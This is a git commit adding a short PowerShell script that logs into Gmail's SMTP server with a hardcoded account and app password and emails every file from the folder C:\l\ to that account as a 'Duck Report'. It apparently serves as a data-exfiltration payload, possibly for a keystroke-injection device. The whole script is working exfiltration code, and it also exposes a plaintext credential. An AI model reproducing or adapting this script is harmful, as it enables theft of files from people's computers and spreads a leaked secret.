02e76a64f79feace3630199c446983057aeeabb9
ducknullius <140725867+ducknullius@users.noreply.github.com>
2023-07-27 10:46:54 -0400

    Add files via upload

---
+++ email.ps1
@@ -0,0 +1,18 @@
+$SMTPServer = 'smtp.gmail.com'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo.EnableSsl = $true
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('duck.nullius@gmail.com', 'udfrisclnwykhrpv');
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+$ReportEmail.From = 'duck.nullius@gmail.com'
+$ReportEmail.To.Add('duck.nullius@gmail.com')
+$ReportEmail.Subject = 'Duck Report'
+$ReportEmail.Body = 'Attached is your duck report.... Quack' 
+$files=Get-ChildItem "C:\l\"
+Foreach($file in $files)
+{
+Write-Host “Attaching File :- ” $file
+$attachment = New-Object System.Net.Mail.Attachment –ArgumentList C:\l\$file
+$ReportEmail.Attachments.Add($attachment)
+$SMTPInfo.Send($ReportEmail)
+}
+write-host "Mail Sent Successfully"
